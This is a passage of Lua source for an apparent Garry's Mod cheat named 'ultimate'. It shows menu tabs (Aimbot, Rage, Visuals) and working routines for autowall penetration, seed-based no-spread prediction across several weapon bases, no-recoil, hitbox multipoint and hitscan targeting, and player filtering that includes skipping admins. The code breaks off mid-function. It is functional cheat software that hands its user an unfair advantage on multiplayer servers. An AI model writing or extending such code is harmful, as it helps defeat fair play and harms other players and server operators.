ultimate.ttable["Aimbot"]   = ultimate.tabs.Aimbot
ultimate.ttable["Rage"]     = ultimate.tabs.Rage
ultimate.ttable["Visuals"]  = ultimate.tabs.Visuals
ultimate.ttable["Misc"]     = ultimate.tabs.Misc
ultimate.ttable["Config"] = ultimate.tabs.Config
ultimate.ttable["Players"]  = ultimate.tabs.Players
ultimate.ttable["Entities"]  = ultimate.tabs.Entities

function ultimate.initTab(tab)
    if ultimate.scrollpanel != nil then ultimate.scrollpanel:Remove() end

    ultimate.scrollpanel = vgui.Create("UScroll",ultimate.frame)

    ultimate.pty = { 5, 5, 5 }
    // ultimate.ESPPP:Hide()
    ultimate.ttable[tostring(tab)]()
end

function ultimate.tabButton(tab,par)
    surface.SetFont("DermaSmall")
    local w, h = surface.GetTextSize(tab)

    local fw = w + 35

    local tx, ty = fw/2 - w/2, 25/2-h/2 - 1

    local b = par:Add("DButton")
    b:Dock(LEFT)
    b:DockMargin(2,0,2,1)
    b:SetWide(fw)
    b:SetText("")

    function b:DoClick()
        ultimate.activetab = tab
        ultimate.initTab(tab)
    end

    function b:Paint(width,height)
        if ultimate.activetab == tab or self:OnDepressed() then
            surface.SetDrawColor(ultimate.Colors[54])
            surface.SetTextColor(245,245,245,255)
        elseif self:IsHovered() then
            surface.SetDrawColor(ultimate.Colors[40])
            surface.SetTextColor(225,225,225,255)
        else
            surface.SetDrawColor(ultimate.Colors[30])
            surface.SetTextColor(200,200,200,255)
        end

        surface.DrawRect(0,0,width,height)

        surface.SetFont("DermaSmall")
        surface.SetTextPos(tx,ty)
        surface.DrawText(tab)
    end
end

ultimate.tabButton( "Aimbot",        ultimate.frame:GetTopPanel() )
ultimate.tabButton( "Rage",          ultimate.frame:GetTopPanel() )
ultimate.tabButton( "Visuals",       ultimate.frame:GetTopPanel() )
ultimate.tabButton( "Misc",          ultimate.frame:GetTopPanel() )
ultimate.tabButton( "Config",        ultimate.frame:GetTopPanel() )
ultimate.tabButton( "Players",       ultimate.frame:GetTopPanel() )
ultimate.tabButton( "Entities",       ultimate.frame:GetTopPanel() )

ultimate.ttable["Aimbot"]()

// Input

function ultimate.IsKeyDown( key )
    if key >= 107 then
        return input.IsMouseDown( key )
    end

    return input.IsKeyDown( key )
end

/*
    Create Move start
*/

// cm stuff

ultimate.target             = false
ultimate.aimingrn           = false

ultimate.targetVector       = Vector()
ultimate.predictedVector    = Vector()
ultimate.backtrackVector    = Vector()
ultimate.nullVec            = Vector() * -1

ultimate.SilentAngle        = pLocalPlayer:EyeAngles()

ultimate.SkipCommand        = false
ultimate.SendPacket         = true

ultimate.traceStruct        = { mask = MASK_SHOT, filter = pLocalPlayer }
ultimate.badSweps           = { ["gmod_camera"] = true, ["manhack_welder"] = true, ["weapon_medkit"] = true, ["gmod_tool"] = true, ["weapon_physgun"] = true, ["weapon_physcannon"] = true, ["weapon_bugbait"] = true, }
ultimate.badSeqs            = { [ACT_VM_RELOAD] = true, [ACT_VM_RELOAD_SILENCED] = true, [ACT_VM_RELOAD_DEPLOYED] = true, [ACT_VM_RELOAD_IDLE] = true, [ACT_VM_RELOAD_EMPTY] = true, [ACT_VM_RELOADEMPTY] = true, [ACT_VM_RELOAD_M203] = true, [ACT_VM_RELOAD_INSERT] = true, [ACT_VM_RELOAD_INSERT_PULL] = true, [ACT_VM_RELOAD_END] = true, [ACT_VM_RELOAD_END_EMPTY] = true, [ACT_VM_RELOAD_INSERT_EMPTY] = true, [ACT_VM_RELOAD2] = true }
ultimate.cones              = {}
ultimate.parsedbones        = {}

ultimate.swbNormal          = bit.bor(CONTENTS_SOLID, CONTENTS_OPAQUE, CONTENTS_MOVEABLE, CONTENTS_DEBRIS, CONTENTS_MONSTER, CONTENTS_HITBOX, 402653442, CONTENTS_WATER)
ultimate.swbWall            = bit.bor(CONTENTS_TESTFOGVOLUME, CONTENTS_EMPTY, CONTENTS_MONSTER, CONTENTS_HITBOX)
ultimate.swbPen             = {[MAT_SAND] = 0.5, [MAT_DIRT] = 0.8, [MAT_METAL] = 1.1, [MAT_TILE] = 0.9, [MAT_WOOD] = 1.2}
ultimate.swbShit            = { ["swb_knife"] = true, ["swb_knife_m"] = true }

ultimate.m9kPenetration     = { ["SniperPenetratedRound"] = 20, ["pistol"] = 9, ["357"] = 12, ["smg1"] = 14, ["ar2"] = 16, ["buckshot"] = 5, ["slam"] = 5, ["AirboatGun"] = 17, }
ultimate.m9kMaxRicochet     = { ["SniperPenetratedRound"] = 10, ["pistol"] = 2, ["357"] = 5, ["smg1"] = 4, ["ar2"] = 5, ["buckshot"] = 0, ["slam"] = 0, ["AirboatGun"] = 9, }
ultimate.m9kCanRicochet     = { ["SniperPenetratedRound"] = true, ["pistol"] = true, ["buckshot"] = true, ["slam"] = true }
ultimate.m9kPenMaterial     = { [MAT_GLASS] = true, [MAT_PLASTIC] = true, [MAT_WOOD] = true, [MAT_FLESH] = true, [MAT_ALIENFLESH] = true }

ultimate.activeWeapon       = false
ultimate.activeWeaponClass  = false
ultimate.moveType           = pLocalPlayer:GetMoveType()

ultimate.backtracktick      = 0

function ultimate.AutoWall( dir, plyTarget )
	if not ultimate.activeWeapon or ultimate.swbShit[ ultimate.activeWeaponClass ] then return false end

	local eyePos = pLocalPlayer:EyePos()
	local ignoreHeadOnly = ultimate.cfg.vars["Ignores-Head unhitable"]

	local function IsTargetHit( tr )
		if ignoreHeadOnly then
			return tr.Entity == plyTarget and tr.HitGroup == 1
		else
			return tr.Entity == plyTarget
		end
	end

	local function DoTrace( startPos, endPos, mask )
		ultimate.traceStruct.start = startPos
		ultimate.traceStruct.endpos = endPos
		ultimate.traceStruct.filter = pLocalPlayer
		ultimate.traceStruct.mask = mask
		return util.TraceLine( ultimate.traceStruct )
	end

	local function SWBAutowall()
		local tr = DoTrace( eyePos, eyePos + dir * ultimate.activeWeapon.PenetrativeRange, ultimate.swbNormal )

		if not tr.Hit or tr.HitSky then return false end

		local dot = -dir:Dot( tr.HitNormal )
		if not ultimate.activeWeapon.CanPenetrate or dot <= 0.26 then return false end

		local penDepth = ultimate.activeWeapon.PenStr * ( ultimate.swbPen[tr.MatType] or 1 ) * ultimate.activeWeapon.PenMod

		tr = DoTrace( tr.HitPos, tr.HitPos + dir * penDepth, ultimate.swbWall )

		tr = DoTrace( tr.HitPos, tr.HitPos + dir * 0.1, ultimate.swbNormal )
		if tr.Hit then return false end

		tr = DoTrace( tr.HitPos, tr.HitPos + dir * 32768, MASK_SHOT )
		return IsTargetHit( tr )
	end

	local function M9KAutowall()
		local penetrate_cvar = GetConVar( "M9KDisablePenetration" )
		if IsValid( penetrate_cvar ) and penetrate_cvar:GetBool() then
			return false
		end

		if not ultimate.activeWeapon.Penetration then
			return false
		end

		local function GetDamageMultiplier( matType, ammoType )
			if ammoType == "SniperPenetratedRound" then
				return 1
			elseif matType == MAT_CONCRETE or matType == MAT_METAL then
				return 0.3
			elseif matType == MAT_WOOD or matType == MAT_PLASTIC or matType == MAT_GLASS then
				return 0.8
			elseif matType == MAT_FLESH or matType == MAT_ALIENFLESH then
				return 0.9
			end
			return 0.5
		end

		local function BulletPenetrate( tr, bounceNum, damage )
			if damage < 1 or tr.Fraction <= 0 then
				return false
			end

			local ammoType = ultimate.activeWeapon.Primary.Ammo
			local maxPenetration = ultimate.m9kPenetration[ ammoType ] or 14
			local maxRicochet = ultimate.m9kMaxRicochet[ ammoType ] or 0
			local canRicochet = ultimate.m9kCanRicochet[ ammoType ] or false

			if tr.MatType == MAT_METAL and canRicochet and ammoType != "SniperPenetratedRound" then
				return false
			end

			if bounceNum > maxRicochet then
				return false
			end

			local penDepth = maxPenetration
			if ultimate.m9kPenMaterial[ tr.MatType ] then
				penDepth = maxPenetration * 2
			end
			local penetrationDir = tr.Normal * penDepth

			local trace = DoTrace( tr.HitPos + penetrationDir, tr.HitPos, MASK_SHOT )

			if trace.StartSolid or trace.Fraction >= 1 then
				return false
			end

			local penTrace = DoTrace( trace.HitPos, trace.HitPos + tr.Normal * 32768, MASK_SHOT )

			if IsTargetHit( penTrace ) then
				return true
			end

			local damageMulti = GetDamageMultiplier( tr.MatType, ammoType )

			local newBounceNum = bounceNum + 1
			if penTrace.MatType == MAT_GLASS then
				newBounceNum = bounceNum
			end

			return BulletPenetrate( penTrace, newBounceNum, damage * damageMulti )
		end

		local trace = DoTrace( eyePos, eyePos + dir * 32768, MASK_SHOT )
		return BulletPenetrate( trace, 0, ultimate.activeWeapon.Primary.Damage )
	end

	local function ARC9Autowall()
		if not ultimate.activeWeapon.Penetration then return false end

		local penetration = ultimate.activeWeapon.Penetration
		local range = ultimate.activeWeapon.RangeMax or 5000
		
		local tr = DoTrace( eyePos, eyePos + dir * range, MASK_SHOT )

		if not tr.Hit or tr.HitSky then return false end
		if IsTargetHit( tr ) then return true end
		local function GetMatMult( mat )
			if mat == MAT_WOOD or mat == MAT_PLASTIC or mat == MAT_GLASS then
				return 1.8
			elseif mat == MAT_CONCRETE or mat == MAT_TILE then
				return 0.5
			elseif mat == MAT_METAL then
				return 0.3
			elseif mat == MAT_FLESH or mat == MAT_ALIENFLESH then
				return 3.0
			end
			return 0.4
		end

		local function IsSolidAt( pos )
			local c = util.PointContents( pos )
			return bit.band( c, CONTENTS_SOLID ) ~= 0 or bit.band( c, CONTENTS_MOVEABLE ) ~= 0
		end

		local function TraceToExit( startPos, dir, maxDist )
			local step = 4
			local dist = 0
			local pos = startPos

			if not IsSolidAt( pos ) then
				pos = pos + dir * 1
			end

			while dist < maxDist do
				dist = dist + step
				pos = startPos + dir * dist
				if not IsSolidAt( pos ) then
					return true, pos
				end
			end

			return false, startPos
		end

		local remaining = penetration * 1.2
		local startPos = eyePos
		local maxLayers = 2

		for i = 1, maxLayers do
			local hitTrace = DoTrace( startPos, startPos + dir * range, MASK_SHOT )
			if not hitTrace.Hit or hitTrace.HitSky then return false end
			if IsTargetHit( hitTrace ) then return true end

			local matMult = GetMatMult( hitTrace.MatType )
			local maxDist = remaining * matMult
			if maxDist <= 0 then return false end

			local ok, exitPos = TraceToExit( hitTrace.HitPos + dir * 1, dir, maxDist )
			if not ok then return false end

			local thickness = hitTrace.HitPos:Distance( exitPos )
			local cost = thickness / matMult
			remaining = remaining - cost
			if remaining <= 0 then return false end

			startPos = exitPos + dir * 1
		end

		return false
	end

	local weaponClass = ultimate.activeWeaponClass

	if string.StartWith( weaponClass, "m9k_" ) or string.StartWith( weaponClass, "bender_" ) then
		return M9KAutowall()
	elseif string.StartWith( weaponClass, "swb_" ) then
		return SWBAutowall()
	elseif string.StartWith( weaponClass, "arc9_" ) then
		return ARC9Autowall()
	end

	return false
end

function ultimate.VisibleCheck( who, where, predticks, awalldir )
    local start = pLocalPlayer:EyePos()

    if predticks then start = start + ( pLocalPlayer:GetVelocity() * flTickInterval ) * predticks end

    ultimate.traceStruct.start = start
	ultimate.traceStruct.endpos = where
	ultimate.traceStruct.mask = MASK_SHOT
    ultimate.traceStruct.filter = pLocalPlayer

    local tr = TraceLine( ultimate.traceStruct )

    local canhit = tr.Entity == who or tr.Fraction == 1

    if !canhit and awalldir and ultimate.cfg.vars["Awall"] then
        return ultimate.AutoWall( awalldir, who )
    end

    if ultimate.cfg.vars["Ignores-Head unhitable"] and tr.HitGroup != 1 then return false end

    return canhit
end

ultimate.flServerTime = 0
function ultimate.CanShoot( cmd )
	if not ultimate.activeWeapon then return false end
	local seq = ultimate.activeWeapon:GetSequence()

    if ultimate.cfg.binds["Aim on key"] != 0 and not ultimate.IsKeyDown( ultimate.cfg.binds["Aim on key"] ) then
        return false
    end

	if ultimate.badSweps[ ultimate.activeWeaponClass ] then
		return false
	end

    if ultimate.moveType == MOVETYPE_NOCLIP then
        return false
    end

    if ultimate.cfg.vars["Auto fire"] and cmd:KeyDown(IN_ATTACK) then
        return false
    end

	if ultimate.cfg.vars["Bullet time"] and ultimate.activeWeapon:GetNextPrimaryFire() >= jopa.GetCurTime()-ultimate.cfg.vars["Time"]  then
		return false
	end

    // print(jopa.GetRandomSeed( cmd ))
    if ultimate.cfg.vars["Wait for seed"] and jopa.GetRandomSeed( cmd ) != 134 then
        return false
    end

	return ultimate.activeWeapon:Clip1() != 0 and !ultimate.badSeqs[ seq ]
end

function ultimate.Spread( cmd, ang, spread )
	if not ultimate.activeWeapon or not ultimate.cones[ ultimate.activeWeaponClass ] then return ang end

	local dir = jopa.PredictSpread( cmd, spread )

	local newangle = ang + dir:Angle()
	newangle:Normalize()

	return newangle
end

/*
    Nospread
*/

ultimate.CustomSpread = {}

function ultimate.CustomSpread.swb(cmd, ang)
    if not ultimate or not ultimate.activeWeapon or not me then return ang end

    if ultimate.cfg.vars["HvHNoSpread"] then
        if not ultimate.activeWeapon.AddSpread then ultimate.activeWeapon.AddSpread = 0 end
        if not ultimate.activeWeapon.AddSpreadSpeed then ultimate.activeWeapon.AddSpreadSpeed = 0 end
        if not ultimate.activeWeapon.MaxSpreadInc then ultimate.activeWeapon.MaxSpreadInc = 0 end
        if not ultimate.activeWeapon.VelocitySensitivity then ultimate.activeWeapon.VelocitySensitivity = 0 end
        if not ultimate.activeWeapon.meMobilitySpreadMod then ultimate.activeWeapon.meMobilitySpreadMod = 1 end
        if not ultimate.activeWeapon.ShotgunReload then ultimate.activeWeapon.ShotgunReload = false end
        if not ultimate.activeWeapon.FireDelay or ultimate.activeWeapon.FireDelay <= 0 then ultimate.activeWeapon.FireDelay = 1 end

        vel = me:GetVelocity():Length()
        dir = ang:Forward()

        if ultimate.activeWeapon.dt and (ultimate.activeWeapon.dt.State == SWB_AIMING or ultimate.activeWeapon.dt.State == swb_AIMING) and ultimate.activeWeapon.AimSpread then
            ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.AimSpread
            if ultimate.activeWeapon.Owner and ultimate.activeWeapon.Owner.Expertise and ultimate.activeWeapon.Owner.Expertise["steadyme"] and ultimate.activeWeapon.Owner.Expertise["steadyme"].val then
                ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.BaseCone * (1 - ultimate.activeWeapon.Owner.Expertise["steadyme"].val * 0.0015)
            end
        else
            ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.HipSpread or 0
            if ultimate.activeWeapon.Owner and ultimate.activeWeapon.Owner.Expertise and ultimate.activeWeapon.Owner.Expertise["wepprof"] and ultimate.activeWeapon.Owner.Expertise["wepprof"].val then
                ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.BaseCone * (1 - ultimate.activeWeapon.Owner.Expertise["wepprof"].val * 0.0015)
            end
        end

        if me:Crouching() then
            ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.BaseCone * ((ultimate.activeWeapon.dt and (ultimate.activeWeapon.dt.State == SWB_AIMING or ultimate.activeWeapon.dt.State == swb_AIMING)) and 0.9 or 0.75)
        end

        updatetime = ultimate.activeWeapon.GetSpreadUpdateTime and ultimate.activeWeapon.GetSpreadUpdateTime(unpredicted) or 0
        value = ultimate.activeWeapon.GetSpreadUpdateValue and ultimate.activeWeapon.GetSpreadUpdateValue(unpredicted) or 0

        if updatetime > 0 then
            value = math.Clamp(value - 0.1333 * (CurTime() - updatetime), 0, ultimate.activeWeapon.MaxSpreadInc)
        end

        viewaff = ultimate.activeWeapon.GetViewAffinity and ultimate.activeWeapon.GetViewAffinity(unpredicted) or 0
        viewafftime = ultimate.activeWeapon.GetViewAffinityTime and ultimate.activeWeapon.GetViewAffinityTime() or CurTime()

        value2 = math.Clamp(viewaff - (ultimate.activeWeapon.ShotgunReload and 0.13 or 0.18) * (CurTime() - viewafftime) / ultimate.activeWeapon.FireDelay, 0, 2)

        ultimate.activeWeapon.CurCone = math.Clamp(
            (ultimate.activeWeapon.BaseCone or 0)
            + value
            + (vel / 10000 * ultimate.activeWeapon.VelocitySensitivity)
            * ((ultimate.activeWeapon.dt and (ultimate.activeWeapon.dt.State == SWB_AIMING or ultimate.activeWeapon.dt.State == swb_AIMING)) and ultimate.activeWeapon.meMobilitySpreadMod or 1)
            + value2,
            0, 0.09 + (ultimate.activeWeapon.MaxSpreadInc or 0)
        )

        math.randomseed(cmd:CommandNumber())

        cone = ultimate.activeWeapon.CurCone
        if not cone then return ang end

        dir1 = Angle(math.Rand(-cone, cone), math.Rand(-cone, cone), 0) * 25
        dir2 = dir1

        if ultimate.activeWeapon.ClumpSpread and ultimate.activeWeapon.ClumpSpread > 0 then
            dir2 = dir1 + Angle(math.Rand(-1, 1), math.Rand(-1, 1), math.Rand(-1, 1)) * ultimate.activeWeapon.ClumpSpread
        end

        return ang - dir2
    end

    if not ultimate.activeWeapon.AddSpread then ultimate.activeWeapon.AddSpread = 0 end
    if not ultimate.activeWeapon.AddSpreadSpeed then ultimate.activeWeapon.AddSpreadSpeed = 0 end
    if not ultimate.activeWeapon.MaxSpreadInc then ultimate.activeWeapon.MaxSpreadInc = 0 end
    if not ultimate.activeWeapon.VelocitySensitivity then ultimate.activeWeapon.VelocitySensitivity = 0 end
    if not ultimate.activeWeapon.meMobilitySpreadMod then ultimate.activeWeapon.meMobilitySpreadMod = 1 end
    if not ultimate.activeWeapon.FireDelay or ultimate.activeWeapon.FireDelay <= 0 then ultimate.activeWeapon.FireDelay = 1 end

    vel = me:GetVelocity():Length()
    dir = ang:Forward()

    if not me.LastView then
        me.LastView = dir
        me.ViewAff = 0
    else
        me.ViewAff = Lerp(0.25, me.ViewAff or 0, (dir - me.LastView):Length() * 0.5)
    end

    if ultimate.activeWeapon.dt and (ultimate.activeWeapon.dt.State == SWB_AIMING or ultimate.activeWeapon.dt.State == swb_AIMING) and ultimate.activeWeapon.meSpread then
        ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.meSpread
        if ultimate.activeWeapon.Owner and ultimate.activeWeapon.Owner.Expertise and ultimate.activeWeapon.Owner.Expertise["steadyme"] and ultimate.activeWeapon.Owner.Expertise["steadyme"].val then
            ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.BaseCone * (1 - ultimate.activeWeapon.Owner.Expertise["steadyme"].val * 0.0015)
        end
    else
        ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.HipSpread or 0
        if ultimate.activeWeapon.Owner and ultimate.activeWeapon.Owner.Expertise and ultimate.activeWeapon.Owner.Expertise["wepprof"] and ultimate.activeWeapon.Owner.Expertise["wepprof"].val then
            ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.BaseCone * (1 - ultimate.activeWeapon.Owner.Expertise["wepprof"].val * 0.0015)
        end
    end

    if me:Crouching() then
        ultimate.activeWeapon.BaseCone = ultimate.activeWeapon.BaseCone * ((ultimate.activeWeapon.dt and (ultimate.activeWeapon.dt.State == SWB_AIMING or ultimate.activeWeapon.dt.State == swb_AIMING)) and 0.9 or 0.75)
    end

    ultimate.activeWeapon.CurCone = math.Clamp(
        (ultimate.activeWeapon.BaseCone or 0)
        + (ultimate.activeWeapon.AddSpread or 0)
        + (vel / 10000 * ultimate.activeWeapon.VelocitySensitivity)
        * ((ultimate.activeWeapon.dt and (ultimate.activeWeapon.dt.State == SWB_AIMING or ultimate.activeWeapon.dt.State == swb_AIMING)) and ultimate.activeWeapon.meMobilitySpreadMod or 1)
        + (me.ViewAff or 0),
        0, 0.09 + (ultimate.activeWeapon.MaxSpreadInc or 0)
    )

    if CurTime() > (ultimate.activeWeapon.SpreadWait or 0) then
        ultimate.activeWeapon.AddSpread = math.Clamp((ultimate.activeWeapon.AddSpread or 0) - 0.005 * (ultimate.activeWeapon.AddSpreadSpeed or 0), 0, ultimate.activeWeapon.MaxSpreadInc or 0)
        ultimate.activeWeapon.AddSpreadSpeed = math.Clamp((ultimate.activeWeapon.AddSpreadSpeed or 0) + 0.05, 0, 1)
    end

    cone = ultimate.activeWeapon.CurCone
    if not cone then return ang end
    if me:Crouching() then
        cone = cone * 0.85
    end

    math.randomseed(cmd:CommandNumber())
    return ang - Angle(math.Rand(-cone, cone), math.Rand(-cone, cone), 0) * 25
end


function ultimate.CustomSpread.cw( cmd, ang )
    local cone = ultimate.activeWeapon.CurCone
    if !cone then return ang end

    math.randomseed( cmd:CommandNumber() )
    return ang - Angle( math.Rand(-cone, cone), math.Rand(-cone, cone), 0 ) * 25
end

function ultimate.CustomSpread.fas2( cmd, ang )
    math.randomseed( CurTime() )

    local dir = Angle( math.Rand( -ultimate.activeWeapon.CurCone, ultimate.activeWeapon.CurCone ), math.Rand( -ultimate.activeWeapon.CurCone, ultimate.activeWeapon.CurCone ), 0 ) * 25
    local dir2 = dir

    if ultimate.activeWeapon.ClumpSpread and ultimate.activeWeapon.ClumpSpread > 0 then
        dir2 = dir + Vector( math.Rand(-1, 1), math.Rand(-1, 1), math.Rand(-1, 1)) * ultimate.activeWeapon.ClumpSpread
    end

    return ang - dir2
end

function ultimate.CustomSpread.tfa(cmd, ang)
    local activeWeapon = ultimate.activeWeapon
    if not activeWeapon then return ang end

    local cone = activeWeapon.GetCone and activeWeapon:GetCone() or activeWeapon.CurCone or 0
    if cone <= 0 then return ang end

    math.randomseed(activeWeapon.Cone.Seed + activeWeapon:Clip1() + activeWeapon:Ammo1())

    local spread = math.Clamp(math.Rand(-cone, cone) * 0.1, -cone, cone)

    return ang - Angle(spread, -spread, 0)
end


function ultimate.CustomSpread.arcw( cmd, ang )
    local angDir = ang:Forward()

	local seed1 = ultimate.activeWeapon:GetBurstCount()
	local seed2 = !game.SinglePlayer() and cmd:CommandNumber() or CurTime()

	local randSeed = util.SharedRandom(seed1, -1337, 1337, seed2) * (ultimate.activeWeapon:EntIndex() % 30241)
	math_randomseed(math_Round(randSeed))

	local spread = ArcCW.MOAToAcc * ultimate.activeWeapon:GetBuff("AccuracyMOA")
	local disp = ultimate.activeWeapon:GetDispersion() * ArcCW.MOAToAcc / 10

	angDir:Rotate(Angle(0, -ArcCW.StrafeTilt(ultimate.activeWeapon), 0))
	angDir = angDir - VectorRand() * disp

	local randSeed = util.SharedRandom(1, -1337, 1337, seed2) * (ultimate.activeWeapon:EntIndex() % 30241)
	math_randomseed(math_Round(randSeed)) 
	angDir = angDir - VectorRand() * spread

	return angDir:Angle()
end

function ultimate.CustomSpread.mg( cmd, ang )
end



ultimate.SpreadComps = {}

ultimate.SpreadComps["swb"]     = ultimate.CustomSpread.swb
ultimate.SpreadComps["cw"]      = ultimate.CustomSpread.cw
ultimate.SpreadComps["fas2"]    = ultimate.CustomSpread.fas2
ultimate.SpreadComps["tfa"]     = ultimate.CustomSpread.tfa
ultimate.SpreadComps["arcw"]    = ultimate.CustomSpread.arcw









function ultimate.NoSpread(cmd, ang)
    if not ultimate.activeWeapon or ultimate.swbShit[ ultimate.activeWeaponClass ] then return ang end
    local base = string.Split( ultimate.activeWeaponClass, "_" )[ 1 ]

    if ultimate.SpreadComps[ base ] then
        ang = ultimate.SpreadComps[ base ]( cmd, ang )
    elseif ultimate.cones[ ultimate.activeWeaponClass ] then
        local spread = ultimate.cones[ ultimate.activeWeaponClass ]
        return ultimate.Spread( cmd, ang, spread )
    end

    return ang
end

function ultimate.NoRecoil( ang )
	if ultimate.activeWeaponClass == "weapon_pistol" or string.StartWith( ultimate.activeWeaponClass,"m9k_" ) or string.StartWith( ultimate.activeWeaponClass,"bb_" ) or string.StartWith( ultimate.activeWeaponClass,"unclen8_" ) then
		return ang
	else
	    ang = ang - pLocalPlayer:GetViewPunchAngles()
    end

	return ang
end

function ultimate.ParseBones( ply, bone )
    local mdl = ply:GetModel()

    if ultimate.parsedbones[ mdl ] and ultimate.parsedbones[ mdl ][ bone ] then
        return ultimate.parsedbones[ mdl ][ bone ]
    end

    if not ultimate.parsedbones[ mdl ] then
        ultimate.parsedbones[ mdl ] = {}
    end

    local set = ply:GetHitboxSet()
    local bonecount = ply:GetBoneCount()

    for i = 0, bonecount - 1 do
		local group = ply:GetHitBoxHitGroup( i, set )

        if group == nil then continue end

		if bone == group then
			ultimate.parsedbones[ mdl ][ bone ] = i

            return i
        end
	end

    for i = 0, bonecount - 1 do
        local group = ply:GetHitBoxHitGroup( i, set )

        if group == nil then continue end

        if bone > 1 and group == 0 then
            ultimate.parsedbones[ mdl ][ bone ] = i

            return i
        end
    end

    return 0
end

function ultimate.MultipointGroupCheck( group )
    if group == 1 and not ultimate.cfg.vars["Multipoint groups-Head"] then return false end
    if group == 2 and not ultimate.cfg.vars["Multipoint groups-Chest"] then return false end
    if group == 3 and not ultimate.cfg.vars["Multipoint groups-Stomach"] then return false end
    if group == 4 or group == 5 and not ultimate.cfg.vars["Multipoint groups-Arms"] then return false end
    if group == 6 or group == 7 and not ultimate.cfg.vars["Multipoint groups-Legs"] then return false end
    if group == 0 and not ultimate.cfg.vars["Multipoint groups-Generic"] then return false end

    return true
end

function ultimate.GetBones( ply )
    local scale = ultimate.cfg.vars["Multipoint scale"]
    local pos = ply:LocalToWorld( ply:OBBCenter() )
    local set = ply:GetHitboxSet()

    if ultimate.cfg.vars["Hitscan"] then
        local set = ply:GetHitboxSet()
        local bonecount = ply:GetBoneCount()

        pos = {}

        for i = 0, bonecount - 1 do
            local group = ply:GetHitBoxHitGroup( i, set )

            if group == nil then continue end

            if group == 1 and not ultimate.cfg.vars["Hitscan groups-Head"] then continue end
            if group == 2 and not ultimate.cfg.vars["Hitscan groups-Chest"] then continue end
            if group == 3 and not ultimate.cfg.vars["Hitscan groups-Stomach"] then continue end
            if group == 4 or group == 5 and not ultimate.cfg.vars["Hitscan groups-Arms"] then continue end
            if group == 6 or group == 7 and not ultimate.cfg.vars["Hitscan groups-Legs"] then continue end
            if group == 0 and not ultimate.cfg.vars["Hitscan groups-Generic"] then continue end

            pos[ #pos + 1 ] = { bone = i, hitgroup = group }
        end

        if not pos or not istable( pos ) then return end

        local valid = {}

        for i = 1, #pos do
            local bone = pos[ i ].bone
            local hitboxbone = ply:GetHitBoxBone( bone, set )

            if hitboxbone == nil then
                continue
            end

            local mins, maxs = ply:GetHitBoxBounds( bone, set )

            if not mins or not maxs then
                continue
            end

            local bonepos, ang = ply:GetBonePosition( hitboxbone )

            if ultimate.cfg.vars["Multipoint"] and ultimate.MultipointGroupCheck( pos[ i ].hitgroup ) then
                local points = {
                    ( ( mins + maxs ) * 0.5 ),
                    Vector( mins.x, mins.y, mins.z ),
                    Vector( mins.x, maxs.y, mins.z ),
                    Vector( maxs.x, maxs.y, mins.z ),
                    Vector( maxs.x, mins.y, mins.z ),
                    Vector( maxs.x, maxs.y, maxs.z ),
                    Vector( mins.x, maxs.y, maxs.z ),
                    Vector( mins.x, mins.y, maxs.z ),
                    Vector( maxs.x, mins.y, maxs.z )
                }

                for i = 1, #points do
                    points[ i ]:Rotate( ang )
                    points[ i ] = points[ i ] + bonepos

                    if i == 1 then continue end

                    points[ i ] = ( ( points[ i ] - points[1] ) * scale ) + points[ 1 ]
                    valid[ #valid + 1 ] = points[ i ]
                end
            end

            mins:Rotate( ang )
            maxs:Rotate( ang )

            valid[ #valid + 1 ] = bonepos + ( ( mins + maxs ) * 0.5 )
        end

        return valid
    else
        local bone = ultimate.ParseBones( ply, ultimate.cfg.vars["Hitbox selection"] )

        local hitboxbone = ply:GetHitBoxBone( bone, set )

        if hitboxbone == nil then
            return { pos }
        end

        local mins, maxs = ply:GetHitBoxBounds( bone, set )

        if not mins or not maxs then
            return { pos }
        end

        local bonepos, ang = ply:GetBonePosition( hitboxbone )

        if ultimate.cfg.vars["Multipoint"] then
            local points = {
                ( ( mins + maxs ) * 0.5 ),
                Vector( mins.x, mins.y, mins.z ),
                Vector( mins.x, maxs.y, mins.z ),
                Vector( maxs.x, maxs.y, mins.z ),
                Vector( maxs.x, mins.y, mins.z ),
                Vector( maxs.x, maxs.y, maxs.z ),
                Vector( mins.x, maxs.y, maxs.z ),
                Vector( mins.x, mins.y, maxs.z ),
                Vector( maxs.x, mins.y, maxs.z )
            }

            for i = 1, #points do
                points[ i ]:Rotate( ang )
                points[ i ] = points[ i ] + bonepos

                if i == 1 then continue end

                points[ i ] = ( ( points[ i ] - points[1] ) * scale ) + points[ 1 ]
            end

            return points
        else
            mins:Rotate( ang )
            maxs:Rotate( ang )

            pos = bonepos + ( ( mins + maxs ) * 0.5 )
        end
    end

    return { pos }
end

function ultimate.GetSortedPlayers( mode, selfpred, plypred, vischeck )
    local players   = player.GetAll()
    local eyepos    = pLocalPlayer:EyePos()
    local valid     = {}

	if selfpred then
		eyepos = eyepos + (pLocalPlayer:GetVelocity() * flTickInterval) * selfpred
	end

    local iTeamLocal = ultimate.GetTeam( pLocalPlayer )

    for i = 1, #players do
        local v = players[i]

        if v == pLocalPlayer then
            continue
        end

        if not v:Alive() or v:IsDormant() then
            continue
        end

        if ultimate.cfg.vars["Ignores-Bots"] and v:IsBot() then continue end
        if ultimate.cfg.vars["Ignores-Friends"] and ultimate.cfg.friends[v:SteamID()] then continue end
        if ultimate.cfg.vars["Ignores-Steam friends"] and v:GetFriendStatus() == "friend" then continue end
        if ultimate.cfg.vars["Ignores-Admins"] and v:IsAdmin() then continue end
        if ultimate.cfg.vars["Ignores-Frozen"] and v:IsFlagSet( FL_FROZEN ) then continue end
        if ultimate.cfg.vars["Ignores-Nodraw"] and v:IsEffectActive( EF_NODRAW ) then continue end
        if ultimate.cfg.vars["Ignores-God time"] and (type(v.HasGodMode) == "function" and v:HasGodMode()) then continue end
        if ultimate.cfg.vars["Ignores-Driver"] and v:InVehicle() then continue end
        if ultimate.cfg.vars["Target-Priority-Only"] and not ultimate.cfg.priorityList[v:SteamID()] then continue end

        local iTeamEnemy = ultimate.GetTeam( v )

        if st == TEAM_SPECTATOR or ultimate.cfg.vars["Ignores-Teammates"] and iTeamLocal == iTeamEnemy then
            continue
        end

        if ultimate.cfg.vars["Ignores-Nocliping"] and v:GetMoveType() == MOVETYPE_NOCLIP then
            continue
        end

        if vischeck then
